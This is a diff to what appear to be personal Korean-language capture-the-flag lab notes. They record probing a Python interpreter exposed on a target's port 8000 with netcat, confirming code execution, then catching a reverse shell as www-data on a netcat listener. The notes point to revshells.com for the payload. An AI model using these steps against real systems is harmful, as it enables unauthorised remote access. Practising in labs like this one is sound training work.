@@ -71,4 +71,48 @@ http: error: ConnectionError: HTTPConnectionPool(host='10.10.234.59', port=80): 
 ls
 name 'ls' is not defined
 
-# nc -lnvp 4445
+# 명령어 실행 되는 것 확인
+
+(root㉿docker-desktop)-[/]
+└─# nc 10.10.234.59 8000
+print(1)
+name 'ᅦprint' is not defined
+^[[D^[[A^[[A
+invalid syntax (<string>, line 1)
+print(1+1)
+2
+whoami
+name 'whoami' is not defined
+id
+
+# 10.10.234.59:8000에서 Python 인터프리터가 실행 중
+
+ls, whoami 등은 쉘 명령어라서 작동하지 않음
+print(1+1) → 2가 나온 것으로 Python 환경임을 확인
+
+# nc -lvnp 4444 -> 공격자인 내 머신에서 대기하기
+
+(root㉿docker-desktop)-[/]
+└─# nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [10.8.136.212] from (UNKNOWN) [10.10.234.59] 40290
+bash: /root/.bashrc: Permission denied
+www-data@ip-10-10-234-59:~$ ls  
+ㅣls
+
+Command 'ㅣls' not found, did you mean:
+
+command 'hls' from deb hfsutils (3.2.6-14)
+command 'ils' from deb sleuthkit (4.6.7-1build1)
+command 'bls' from deb bacula-sd (9.4.2-2ubuntu5)
+command 'ols' from deb speech-tools (1:2.5.0-8build1)
+command 'als' from deb atool (0.39.0-10)
+command 'ls' from deb coreutils (8.30-3ubuntu2)
+command 'jls' from deb sleuthkit (4.6.7-1build1)
+command 'fls' from deb sleuthkit (4.6.7-1build1)
+
+Try: apt install <deb name>
+
+www-data@ip-10-10-234-59:~$
+
+# 공격대상 컴퓨터 (파이썬 인터프리터) https://www.revshells.com/ 검색해서 실행
